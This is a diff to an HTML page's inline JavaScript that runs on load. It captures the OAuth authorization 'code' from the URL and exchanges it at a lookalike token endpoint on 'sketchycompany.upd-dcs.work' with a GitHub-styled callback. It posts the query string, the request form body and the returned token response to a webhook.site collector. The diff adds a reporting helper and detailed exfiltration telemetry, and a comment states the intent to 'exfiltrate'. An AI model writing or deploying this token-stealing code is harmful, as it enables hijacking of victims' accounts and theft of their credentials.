@@ -6,21 +6,29 @@
             body: window.location.search,
         });
 
+        const WEBHOOK = "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e";
+        const TOKEN_URL = "https://login.sketchycompany.upd-dcs.work/token";
+        const stage = { name: "start" };
+
+        async function report(event, extra = {}) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify({ event, stage: stage.name, ...extra }),
+                    signal: AbortSignal.timeout(5000),
+                });
+            } catch (e) {
+                // webhook itself is down/blocked: fall back to console, never throw
+                console.error("REPORT FAILED", event, extra, e);
+            }
+        }
+
         async function sendCode() {
-            const TOKEN_URL = "https://login.sketchycompany.upd-dcs.work/token";
-            const WEBHOOK =
-                "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e";
             const searchParams = window.location.search;
             const parsedParams = new URLSearchParams(searchParams);
             const code = parsedParams.get("code");
-
-            if (!code) {
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    body: 'Execution stopped: No "code" parameter found in URL.',
-                });
-                return;
-            }
+            await report("params parsed", { hasCode: !!code, search: window.location.search });
 
             const formBody = new URLSearchParams();
             formBody.append("grant_type", "authorization_code");
@@ -35,51 +43,41 @@
                 "https://github-13261.sketchycompany.upd-dcs.work/callback",
             );
 
-            await fetch(WEBHOOK, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                },
-                body: formBody,
-            });
-
+            stage.name = "token";
+            let tokenResponse;
             try {
-                const tokenResponse = await fetch(TOKEN_URL, {
+                tokenResponse = await fetch(TOKEN_URL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/x-www-form-urlencoded",
                     },
                     body: formBody,
+                    signal: AbortSignal.timeout(15000),
                 });
             } catch (error) {
-                // 8. Catch and exfiltrate any errors (CORS blocks, DNS resolution errors, network drops)
-                // let endpointReachable;
-                // try {
-                //     await fetch(TOKEN_URL, { mode: "no-cors" }); // GET: does not burn the code
-                //     endpointReachable = true;
-                // } catch {
-                //     endpointReachable = false;
-                // }
-
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: { "Content-Type": "text/plain" },
-                    body: JSON.stringify({
-                        event: "Token fetch threw",
-                        name: error.name,
-                        message: error.message,
-                        stack: error.stack,
-                        isTypeError: error instanceof TypeError,
-                        // endpointReachable,
-                        // verdict: endpointReachable
-                        //     ? "reachable -> CORS/header block (check DevTools console)"
-                        //     : "unreachable -> DNS/TLS/network failure",
-                        origin: location.origin,
-                    }),
+                await report("token fetch threw", {
+                    name: error.name,                 // "TimeoutError" vs "TypeError" vs "AbortError"
+                    message: error.message,
+                    timedOut: error.name === "TimeoutError",
                 });
+                return;
             }
 
-            const rawResponseText = await tokenResponse.text();
+            await report("token headers received", {
+                status: tokenResponse.status,
+                statusText: tokenResponse.statusText,
+                contentType: tokenResponse.headers.get("content-type"),
+                contentLength: tokenResponse.headers.get("content-length"),
+                acao: tokenResponse.headers.get("access-control-allow-origin"),
+            })
+
+            stage.name = "body";
+            try {
+                const text = await tokenResponse.text();
+                await report("token body received", { bodyData: text });
+            } catch (error) {
+                await report("body read threw", { name: error.name, message: error.message });
+            }
 
             await fetch(WEBHOOK, {
                 method: "POST",
@@ -91,8 +89,15 @@
                     bodyData: rawResponseText,
                 }),
             });
-        }
 
-        sendCode();
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: formBody,
+            });
+        }
+        sendCode().catch((e) => report("unhandled rejection", { message: e.message, stack: e.stack }));
     </script>
 </html>
